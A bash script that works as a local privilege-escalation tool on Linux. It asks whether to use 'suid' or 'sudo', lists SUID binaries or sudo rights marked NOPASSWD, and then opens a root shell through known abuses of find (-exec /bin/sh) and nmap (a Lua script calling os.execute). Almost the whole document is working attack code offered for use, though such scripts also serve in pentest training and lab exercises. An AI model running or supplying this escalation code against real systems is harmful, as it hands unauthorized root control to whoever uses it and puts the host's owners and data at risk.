#!/bin/bash

echo "Which type of exploits would you like to run? Enter 'suid' or 'sudo': "
read executable_type

if [ "$executable_type" == "suid" ]; then
    # Search for all binaries with the SUID bit set
    echo "searching for suid"
    binaries=$(find / -type f -perm -4000 2>/dev/null)
elif [ "$executable_type" == "sudo" ]; then	   
    # We list user privileges, we filter according to root and nopasswd criteria
    binaries=$(sudo -l | awk '/(root|\bNOPASSWD\b)/ {print $0}')
else
    # Invalid input
    echo "Invalid input. Please enter 'suid' or 'sudo'."
    exit 1
fi

command=""

# This is the functon that will escalate the privilege using sudo exploits
function find_sudo_escalation() {
    
    if [[ -z $1 ]]; then
	    echo "Cannot escalate, no NOPASSWD found"
	    exit 0
    fi

    echo "Escalating using: $1"

    if [ "$1" == "find" ]; then
            sudo find . -exec /bin/sh \; -quit
    elif [ "$1" == "nmap" ]; then
            TF=$(mktemp)
            echo 'os.execute("/bin/sh")' > $TF
            sudo nmap --script=$TF
    fi
    # Support for other exploits can be added here
}

# This is the functon that will escalate the privilege using suid exploits
function find_suid_escalation() {
   
    if [[ -z $1 ]]; then
            echo "Cannot escalate, no binaries found"
            exit 0
    fi

    echo "Escalating using: $1"
    
    if [ "$1" == "find" ]; then
	    find . -exec /bin/sh -p \; -quit
    fi

    # Support for other exploits can be added here
}


# We iterate the privileges and matching to specific ones
while IFS= read -r line; do

  if [[ "$line" == *find* ]]; then
	  command="find"
	  break
  elif [[ "$line" == *nmap* ]]; then
	  if [ "$executable_type" == "suid" ]; then
		  continue	#nmap exploits are not implemented for suid 
	  fi
  	  command="nmap"
	  break
  fi
  # Support for other exploits can be added here
done < <(echo "$binaries")


if [ "$executable_type" == "suid" ]; then
    # We call the escalation function with one of the executables that has suid bit set
    find_suid_escalation $command
elif [ "$executable_type" == "sudo" ]; then
    # We call the escalation function with one of the executables that can run with no sudo passwd
    find_sudo_escalation $command
fi
